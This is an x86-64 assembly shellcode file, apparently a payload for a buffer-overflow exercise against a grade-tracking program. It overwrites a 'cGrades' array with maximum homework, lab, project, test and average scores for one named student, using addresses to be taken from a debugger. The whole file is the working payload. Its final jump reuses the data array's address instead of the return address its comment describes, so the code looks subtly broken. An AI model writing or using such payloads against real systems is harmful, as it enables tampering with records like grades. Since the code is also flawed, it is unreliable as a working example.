.text
.globl _start
_start:
    # Minimal working shellcode - just modify the grades we need
    # For Akarca_Tolga (student 0 in section C)
    
    movabs $0x55555555bc00, %rax    # cGrades base - GET FROM: p/x &cGrades
    
    # HW (rows 0-8): max 6, offset = row*400
    movl $6, 0(%rax)
    movl $6, 400(%rax)
    movl $6, 800(%rax)
    movl $6, 1200(%rax)
    movl $6, 1600(%rax)
    movl $6, 2000(%rax)
    movl $6, 2400(%rax)
    movl $6, 2800(%rax)
    movl $6, 3200(%rax)
    
    # Labs (rows 9-18): max 7
    movl $7, 3600(%rax)
    movl $7, 4000(%rax)
    movl $7, 4400(%rax)
    movl $7, 4800(%rax)
    movl $7, 5200(%rax)
    movl $7, 5600(%rax)
    movl $7, 6000(%rax)
    movl $7, 6400(%rax)
    movl $7, 6800(%rax)
    movl $7, 7200(%rax)
    
    # Projects (rows 19-22): max 59
    movl $59, 7600(%rax)
    movl $59, 8000(%rax)
    movl $59, 8400(%rax)
    movl $59, 8800(%rax)
    
    # Tests (rows 23-24): max 61
    movl $61, 9200(%rax)
    movl $61, 9600(%rax)
    
    # AVG (row 25)
    movl $100, 10000(%rax)
    
    # Return - GET FROM: disassemble main, find address after "call getUserLine"
    movabs $0x55555555bc00, %rax
    jmp *%rax